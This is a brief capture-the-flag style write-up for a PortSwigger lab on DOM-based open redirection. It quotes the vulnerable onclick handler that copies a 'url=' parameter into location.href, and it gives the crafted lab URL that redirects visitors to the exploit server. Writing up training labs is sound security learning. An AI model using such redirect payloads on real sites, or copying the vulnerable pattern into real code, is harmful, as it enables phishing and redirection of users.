# DOM-based open redirection
Lab URL :- 

`https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection`

![image](https://user-images.githubusercontent.com/60841283/153748712-05ae0c8e-33f5-49f6-a3a1-99a5da71958e.png)

In source of post 
```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```

Payload in exploit server (in Body section) :- 
```html
https://ac4e1f0a1fd2a1f0c0e43be1003a009c.web-security-academy.net/post?postId=1&url=https://exploit-ac351fdf1f43a1a9c0fa3b5601990086.web-security-academy.net
```

![image](https://user-images.githubusercontent.com/60841283/153748642-fed26e4e-42aa-4edb-bf14-f51fae18034b.png)
